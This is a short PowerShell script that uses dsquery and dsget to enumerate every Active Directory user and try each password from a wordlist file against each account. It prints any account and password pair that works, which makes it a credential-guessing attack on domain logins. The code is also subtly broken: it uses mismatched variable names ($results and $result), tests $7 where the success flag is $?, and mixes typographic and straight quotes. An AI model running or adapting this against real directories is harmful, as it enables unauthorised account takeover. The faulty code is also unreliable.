dsquery user - limit 0>users

foreach ($FDN in Get-Content .\users)

{

$results =dsget user $FDN -samid 

   $samid=$result[1].replace(" ",””)

   Write-Host $samid 

   foreach($password in Get-Content .\password.txt)

    {

       $password=$password.replace(“ “,””)

       dsget user $FDN -u $samid -p$password >$null

        if($7){

           Write-Host “Account : $samid Password: $password"
            }

    }

}
